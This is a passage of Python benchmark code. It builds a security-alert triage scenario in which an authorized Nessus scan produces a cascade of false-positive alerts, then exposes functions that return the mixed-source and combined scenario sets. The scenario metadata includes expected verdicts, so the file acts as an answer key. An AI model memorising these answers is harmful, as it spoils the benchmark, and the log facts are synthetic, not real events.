                   "10.0.1.250:40003 -> 10.0.1.20:445/TCP (SYN-only, 2 pkts, 120B)",
                   datetime(2026, 3, 18, 8, 0, 4),
                   SourceType.NETFLOW, netflow_src),
        _make_fact(prefix, 11, "scan-flow-5", EntityType.EDGE, "network_connection",
                   "10.0.1.250:40004 -> 10.0.1.20:3389/TCP (SYN-only, 2 pkts, 120B)",
                   datetime(2026, 3, 18, 8, 0, 5),
                   SourceType.NETFLOW, netflow_src),

        # --- AUTH_LOG: scanner service account + authorization (facts 12-15) ---
        _make_fact(prefix, 12, "scanner-logon", EntityType.NODE, "logon_type",
                   "3 (Network logon via service account svc_scanner)",
                   datetime(2026, 3, 18, 8, 0, 0),
                   SourceType.AUTH_LOG, auth_src),
        _make_fact(prefix, 13, "scanner-logon", EntityType.NODE, "logon_account",
                   "CORP\\svc_scanner (authorized vulnerability scanning service account)",
                   datetime(2026, 3, 18, 8, 0, 0),
                   SourceType.AUTH_LOG, auth_src),
        _make_fact(prefix, 14, "scanner-auth", EntityType.NODE, "authorization_status",
                   "Scanner IP 10.0.1.250 is in approved scanning whitelist (updated 2026-03-01)",
                   datetime(2026, 3, 18, 8, 0, 0),
                   SourceType.AUTH_LOG, auth_src),
        _make_fact(prefix, 15, "scan-schedule", EntityType.NODE, "scheduled_task",
                   "Weekly vulnerability scan: Wednesdays 08:00-10:00 (approved by CISO)",
                   datetime(2026, 3, 18, 8, 0, 0),
                   SourceType.AUTH_LOG, auth_src),

        # --- PROCESS_LIST: scanner process on scanner host (facts 16-18) ---
        _make_fact(prefix, 16, "nessus-proc", EntityType.NODE, "process_name",
                   "nessusd",
                   datetime(2026, 3, 18, 7, 55, 5),
                   SourceType.PROCESS_LIST, proc_src),
        _make_fact(prefix, 17, "nessus-proc", EntityType.NODE, "command_line",
                   "/opt/nessus/sbin/nessusd --config /opt/nessus/etc/nessus/nessusd.conf",
                   datetime(2026, 3, 18, 7, 55, 5),
                   SourceType.PROCESS_LIST, proc_src),
        _make_fact(prefix, 18, "scan-scope", EntityType.NODE, "scan_scope",
                   "Internal network 10.0.1.0/24 only (no external targets)",
                   datetime(2026, 3, 18, 8, 0, 0),
                   SourceType.PROCESS_LIST, proc_src),
    ]

    for fact in facts:
        packet.add_fact(fact)
    packet.freeze()

    metadata = ScenarioMetadata(
        scenario_id="SC-018",
        name="Multi-Source False Positive Cascade",
        description="Authorized vulnerability scanner triggers firewall, IDS, and auth alerts",
        mitre_attack_ids=("T1046",),
        mitre_tactic="Discovery",
        difficulty_tier=3,
        expected_verdict="THREAT_DISMISSED",
        expected_winner="SKEPTIC",
        fact_count=len(facts),
        notes="Tier 3 — 4 sources; authorization context across all sources dismisses the alert cascade",
    )

    return BenchmarkScenario(metadata=metadata, packet=packet)


# =============================================================================
# Public API
# =============================================================================

_MIXED_BUILDERS = (
    build_sc013_coordinated_brute_force,
    build_sc014_exfiltration_with_cover,
    build_sc015_legitimate_maintenance,
    build_sc016_c2_beaconing_lateral,
    build_sc017_cloud_backup_ambiguity,
    build_sc018_scanner_false_positive,
)


def get_mixed_source_scenarios() -> tuple[BenchmarkScenario, ...]:
    """Return all 6 mixed-source benchmark scenarios (SC-013 through SC-018).

    Returns:
        Immutable tuple of BenchmarkScenario instances.
    """
    return tuple(builder() for builder in _MIXED_BUILDERS)


def get_combined_corpus() -> tuple[BenchmarkScenario, ...]:
    """Return all 18 scenarios: original 12 + 6 mixed-source.

    Returns:
        Immutable tuple of all BenchmarkScenario instances, ordered SC-001 to SC-018.
    """
    return _get_original_scenarios() + get_mixed_source_scenarios()


def get_mixed_scenario_by_id(scenario_id: str) -> BenchmarkScenario:
    """Return a specific mixed-source scenario by ID.

    Args:
        scenario_id: The scenario ID to look up (e.g., "SC-013").

    Returns:
        The matching BenchmarkScenario.

    Raises:
        KeyError: If no mixed-source scenario with the given ID exists.
    """
    scenarios = {s.metadata.scenario_id: s for s in get_mixed_source_scenarios()}
    if scenario_id not in scenarios:
        raise KeyError(f"No mixed-source scenario with ID '{scenario_id}'")
    return scenarios[scenario_id]
